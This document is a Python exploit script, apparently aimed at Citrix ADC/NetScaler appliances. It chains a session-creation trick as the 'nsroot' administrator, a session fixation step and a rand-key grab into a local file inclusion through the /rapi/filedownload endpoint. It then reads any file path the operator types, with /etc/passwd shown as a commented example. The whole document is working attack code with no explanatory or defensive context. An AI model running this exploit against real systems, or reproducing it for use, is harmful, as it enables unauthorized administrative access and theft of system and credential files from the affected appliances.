#!/usr/bin/env python

import requests
import sys
import string
import random
import json
from urllib.parse import quote



requests.packages.urllib3.disable_warnings()

def random_string(length=8):
	chars = string.ascii_letters + string.digits
	random_string = ''.join(random.choice(chars) for x in range(length))
	return random_string

def create_session(base_url, session):
	url = '{0}/pcidss/report'.format(base_url)

	params = {
		'type':'allprofiles',
		'sid':'loginchallengeresponse1requestbody',
		'username':'nsroot',
		'set':'1'
	}

	headers = {
		'Content-Type':'application/xml',
		'X-NITRO-USER':random_string(),
		'X-NITRO-PASS':random_string(),
	}

	data = '<appfwprofile><login></login></appfwprofile>'
	proxies = {"http":"http://127.0.0.1:8080/"}
	session.post(url=url, params=params, headers=headers, data=data, verify=False,proxies=proxies)
	return session

def fix_session(base_url, session):
	url = '{0}/menu/ss'.format(base_url)

	params = {
		'sid':'nsroot',
		'username':'nsroot',
		'force_setup':'1'
	}
	proxies = {"http":"http://127.0.0.1:8080/"}
	session.get(url=url, params=params, verify=False,proxies=proxies)

def get_rand(base_url, session):
	url = '{0}/menu/stc'.format(base_url)
	proxies = {"http":"http://127.0.0.1:8080/"}
	r = session.get(url=url, verify=False,proxies=proxies)

	for line in r.text.split('\n'):
		if 'var rand =' in line:
			rand = line.split('"')[1]
			return rand

def do_lfi(base_url, session, rand):
	url = '{0}/rapi/filedownload?filter=path:{1}'.format(base_url, PAYLOAD)

	headers = {
		'Content-Type':'application/xml',
		'X-NITRO-USER':random_string(),
		'X-NITRO-PASS':random_string(),
		'rand_key':rand
	}

	data = '<clipermission></clipermission>'
	proxies = {"http":"http://127.0.0.1:8080/"}
	r = session.post(url=url, headers=headers, data=data, verify=False,proxies=proxies)
	response_str = json.dumps(r.headers.__dict__['_store'])

	if r.status_code == 406 and "Content-Disposition" in response_str and r.headers["Accept-Ranges"] == "bytes" and r.headers["Pragma"] == "private":
		print ("[+] Send Success!")
		print ("_"*80,"\n\n")
		print (r.text)
		print ("_"*80)
		while 1:
			PAYLOAD1 = quote(input("\n[+] Set File= "),"utf-8")
			url = '{0}/rapi/filedownload?filter=path:{1}'.format(base_url, PAYLOAD1)
			r = session.post(url=url, headers=headers, data=data, verify=False,proxies=proxies)
			if r.status_code == 406 and "Content-Disposition" in response_str and r.headers["Accept-Ranges"] == "bytes" and r.headers["Pragma"] == "private":
				print ("_"*80,"\n\n")
				print (r.text)
				print ("_"*80)
			# pass
	else:
		print ("[+] Error!")

def main(base_url):
	print ('[-] Creating session..')
	session = requests.Session()
	create_session(base_url, session)
	print ('[+] Got session: {0}'.format(session.cookies.get_dict()['SESSID']))

	print('[-] Fixing session..')
	fix_session(base_url, session)

	print ('[-] Getting rand..')
	rand = get_rand(base_url, session)
	print ('[+] Got rand: {0}'.format(rand))

	print ('[-] Re-breaking session..')
	create_session(base_url, session)

	print ('[-] Getting file..')
	do_lfi(base_url, session, rand)

if __name__ == '__main__':
	# Slashes need to be urlencoded
	base_url = sys.argv[1]
	if base_url[-1] == '/':
		base_url = base_url[:-1]
	else:
		base_url = base_url
	# PAYLOAD='%2fetc%2fpasswd'
	PAYLOAD = quote(input("[+] Set File= "),"utf-8")
	main(base_url)

